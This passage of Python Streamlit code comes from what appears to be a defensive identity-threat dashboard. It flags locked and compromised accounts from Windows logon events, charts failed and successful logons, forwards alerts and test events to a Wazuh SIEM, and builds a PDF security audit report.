        cols = detect_columns(df)
        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]

        st.subheader("🔒 Active Lockout Watchlist (Smart Lockout Triggered)")

        if event_col and user_col:
            lockout_users = df[event_matches(df[event_col], 4625)][user_col].value_counts()
            locked_accounts = lockout_users[lockout_users >= 3].index.tolist()
        else:
            lockout_users = pd.Series(dtype=int)
            locked_accounts = []

        if len(locked_accounts) > 0:
            cols_ui = st.columns(min(len(locked_accounts), 4))
            for idx, account in enumerate(locked_accounts):
                with cols_ui[idx % 4]:
                    st.error(f"👤 **Account:** `{account}`\n\n🚨 **Status:** LOCKED (AADSTS50053)\n\n📍 **Attempts:** {lockout_users[account]} Failures")
        else:
            st.success("✅ No accounts currently locked by Microsoft Smart Lockout threshold.")

        st.markdown("---")

        # --- YENİ: 🔓 Compromised Accounts bölməsi ---
        st.subheader("🔓 Compromised Accounts (Successful Logon After/During Attack)")

        if event_col and user_col:
            compromised_mask = df[event_col].astype(str).str.contains('4624')
            compromised_users_df = df[compromised_mask]
            compromised_accounts = compromised_users_df[user_col].dropna().unique().tolist()
        else:
            compromised_accounts = []

        if len(compromised_accounts) > 0:
            cols_comp = st.columns(min(len(compromised_accounts), 4))
            for idx, account in enumerate(compromised_accounts):
                acc_ip = compromised_users_df[compromised_users_df[user_col] == account][ip_col].iloc[0] if ip_col else "N/A"
                is_resolved = account in st.session_state['resolved_users']
                with cols_comp[idx % 4]:
                    if is_resolved:
                        st.success(f"👤 **Account:** `{account}`\n\n✅ **Status:** Remediated\n\n📍 **IP:** {acc_ip}")
                    else:
                        st.error(f"👤 **Account:** `{account}`\n\n🚨 **Status:** COMPROMISED (4624 SUCCESS)\n\n📍 **IP:** {acc_ip}\n\n⚠️ Session revoke + disable required!")
        else:
            st.success("✅ No successful attacker logons detected — no accounts currently compromised.")

        st.markdown("---")

        col_feed, col_logs = st.columns([1, 1.2])

        with col_feed:
            st.subheader("⚡ Live Incident Feed")
            severity_filter = st.selectbox("Filter by Severity", ["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW"])

            for idx, row in df.iterrows():
                event_id = row.get(event_col, 4625) if event_col else 4625
                user = row.get(user_col, "Unknown") if user_col else "Unknown"
                ip = row.get(ip_col, "127.0.0.1") if ip_col else "127.0.0.1"
                err_code = row.get("ErrorCode", "AADSTS50126")

                # DÜZƏLİŞ (kök səbəb): əvvəlki `event_id == 4624` bərabərlik müqayisəsi
                # EventID sütununun tipi (str vs int) mənbəyə görə dəyişəndə səssizcə
                # False qaytarırdı və COMPROMISED istifadəçilər səhvən "LOW" görünürdü.
                # classify_risk() tipdən asılı olmayan str-based yoxlama aparır.
                risk = classify_risk(event_id)

                if risk == "COMPROMISED":
                    sev = "CRITICAL"
                elif err_code == "AADSTS50053" or (risk == "ATTEMPTED" and idx > 3):
                    sev = "CRITICAL"
                elif err_code == "AADSTS50034":
                    sev = "MEDIUM"
                elif risk == "ATTEMPTED":
                    sev = "HIGH"
                else:
                    sev = "LOW"

                if severity_filter != "ALL" and sev != severity_filter:
                    continue

                if sev == "CRITICAL" and risk == "COMPROMISED":
                    st.error(f"🔴 **[CRITICAL]** Successful Attacker Logon (`4624`) — Account COMPROMISED: `{user}` from `{ip}`")
                elif sev == "CRITICAL":
                    st.error(f"🔴 **[CRITICAL]** Account Lockout / Brute Force on `{user}` from `{ip}` | Error: `{err_code}`")
                elif sev == "HIGH":
                    st.warning(f"🟠 **[HIGH]** Failed Authentication (`4625`) on `{user}` from `{ip}` | Error: `{err_code}`")
                elif sev == "MEDIUM":
                    st.info(f"🟡 **[MEDIUM]** User Enumeration (`4625`) on `{user}` from `{ip}` | Error: `{err_code}`")
                else:
                    st.info(f"🟢 **[LOW]** Informational event for `{user}` from `{ip}`")

        with col_logs:
            st.subheader("📋 Entra ID Sign-in Logs Table")
            st.caption("🔴 Kompromis olmuş (4624) sətirlər ən yuxarıda göstərilir ki, cədvəldə itməsin.")
            display_df = df.copy()
            if event_col:
                display_df['_risk'] = display_df[event_col].apply(classify_risk)
                display_df = display_df.sort_values(
                    '_risk', key=lambda s: s.map({'COMPROMISED': 0, 'ATTEMPTED': 1}).fillna(2),
                    kind='mergesort'
                ).drop(columns=['_risk'])
            st.dataframe(display_df, use_container_width=True)
    else:
        st.warning("⚠️ No telemetry feed available. Ingest logs in Tab 1 or trigger Red Team simulation in Tab 3.")

# TAB 5: Interactive Analytics
with tab5:
    st.header("📊 Interactive Analytics & Threat Visualizations")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col = cols["event"], cols["user"]

        col_left, col_right = st.columns(2)

        with col_left:
            st.subheader("🎯 Top 5 Targeted Accounts")
            if event_col and user_col:
                failed_df = df[event_matches(df[event_col], 4625)]
                if len(failed_df) > 0:
                    top_users = failed_df[user_col].value_counts().head(5).reset_index()
                    top_users.columns = ['Account Name', 'Failed Attempts']

                    fig_bar = px.bar(top_users, x='Failed Attempts', y='Account Name', orientation='h',
                                      color='Failed Attempts', color_continuous_scale='Reds', text='Failed Attempts')
                    st.plotly_chart(fig_bar, use_container_width=True)
                else:
                    st.info("No failed logon attempts recorded.")
            else:
                st.info("İstifadəçi/hadisə sütunları tapılmadı.")

        with col_right:
            st.subheader("📊 Failure vs Success Ratio")
            if event_col:
                # .map({4625: ...}) sütun tipi (int vs str) uyğun gəlmədikdə NaN qaytarırdı;
                # classify_risk() əsaslı str-based yoxlama tipdən asılı olmadan işləyir.
                status_labels = df[event_col].apply(
                    lambda x: 'SUCCESS (4624)' if classify_risk(x) == 'COMPROMISED'
                    else ('FAILED (4625)' if classify_risk(x) == 'ATTEMPTED' else 'OTHER')
                )
                status_counts = status_labels.value_counts().reset_index()
                status_counts.columns = ['Logon Status', 'Event Count']

                fig_pie = px.pie(status_counts, names='Logon Status', values='Event Count', color='Logon Status',
                                  color_discrete_map={'FAILED (4625)': '#ef553b', 'SUCCESS (4624)': '#00cc96', 'OTHER': '#888888'}, hole=0.4)
                st.plotly_chart(fig_pie, use_container_width=True)

        st.markdown("---")
        st.subheader("📈 Attack Intensity Timeline & Velocity")
        df_timeline = df.copy()
        df_timeline['Attempt_Sequence'] = df_timeline.index + 1

        if event_col:
            df_timeline['Event_Type'] = df_timeline[event_col].apply(
                lambda x: "Success Logon (4624)" if classify_risk(x) == 'COMPROMISED'
                else ("Failed Logon (4625)" if classify_risk(x) == 'ATTEMPTED' else "Other"))
            fig_line = px.line(df_timeline, x='Attempt_Sequence', y=df_timeline.index, color='Event_Type', markers=True,
                                color_discrete_map={'Failed Logon (4625)': '#d62728', 'Success Logon (4624)': '#2ca02c', 'Other': '#888888'})
            st.plotly_chart(fig_line, use_container_width=True)
    else:
        st.warning("⚠️ No data available for visualization.")

# TAB 6: Threat Detection Engine
with tab6:
    st.header("Threat Detection Engine")
    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        st.warning("⚠️ High Risk Identity Threats Detected!")

        if st.button("🚨 Dispatch All Threats to Wazuh SIEM"):
            success_count = 0
            fail_details = []
            for idx, row in df.iterrows():
                payload = {
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "event_id": row.get("EventID", 4625),
                    "user": row.get("TargetUserName", "unknown"),
                    "source_ip": row.get("IpAddress", "127.0.0.1"),
                    "rule_title": "Identity Anomaly Detected",
                    "severity": "HIGH", "source": "Argus-ITDR"
                }
                status, detail = send_to_wazuh(payload)
                if status:
                    success_count += 1
                else:
                    fail_details.append(f"{payload['user']}: {detail}")

            if not fail_details:
                st.success(f"✅ Dispatched {success_count} events to the Argus log bridge!")
            else:
                st.error(f"⚠️ Dispatched {success_count}/{len(df)} events. {len(fail_details)} failed.")
                with st.expander("🔎 Failure details"):
                    for d in fail_details:
                        st.code(d)
    else:
        st.info("No threats to dispatch.")

# TAB 7: SIEM Integration Test
with tab7:
    st.header("Manual Telemetry Injection")
    col1, col2 = st.columns(2)
    with col1:
        target_user = st.text_input("Target User", value="john_doe")
        source_ip = st.text_input("Source IP", value="10.0.0.45")
    with col2:
        event_type = st.selectbox("Event Type", ["Brute Force Attack", "Kerberoasting", "Golden Ticket Misuse"])
        severity = st.selectbox("Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"], index=2)

    if st.button("Send Live Telemetry"):
        test_payload = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "user": target_user, "source_ip": source_ip,
            "rule_title": event_type, "severity": severity, "source": "Argus-ITDR-ManualTest"
        }
        ok, res = send_to_wazuh(test_payload)
        if ok:
            st.success("✅ Log written to the Argus log bridge — check the Wazuh manager alerts to confirm ingestion.")
            st.json(test_payload)
        else:
            st.error(f"❌ Failed: {res}")

# TAB 8: Security Audit Report Generator
with tab8:
    st.header("📄 Automated PDF Security Audit Report Generator")
    st.caption("Generate an official, executive-ready PDF Audit Report containing attack telemetry, risk scoring, and remediation history.")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        resolved_users = st.session_state.get('resolved_users', set())

        cols = detect_columns(df)
        event_col = cols["event"]
        failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else len(df)
        compromised_attempts = len(df[df[event_col].astype(str).str.contains('4624')]) if event_col else 0
        active_failures = max(0, failed_attempts - len(resolved_users))
        active_compromised = max(0, compromised_attempts - len(resolved_users))
        posture_score = max(0, 100 - (active_failures * 10) - (active_compromised * 20))

        st.subheader("📋 Report Content Preview Summary")

        c1, c2, c3, c4 = st.columns(4)
        with c1:
            st.info(f"**Total Events Included:** {len(df)}")
        with c2:
            st.error(f"**Failed Attempts:** {failed_attempts}")
        with c3:
            st.error(f"**Compromised Accounts:** {compromised_attempts}")
        with c4:
            st.success(f"**Remediated Accounts:** {len(resolved_users)}")

        st.markdown("---")
        st.subheader("📥 Export Audit Report")

        pdf_bytes = generate_pdf_report(df, resolved_users, posture_score)

        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"Argus_ITDR_Security_Report_{timestamp_str}.pdf"

        st.download_button(
            label="📄 Download Official PDF Security Audit Report",
            data=pdf_bytes,
            file_name=filename,
            mime="application/pdf",
            use_container_width=True
        )
    else:
        st.warning("⚠️ No simulation data or telemetry available to build a report. Run Red Team simulations or upload logs first.")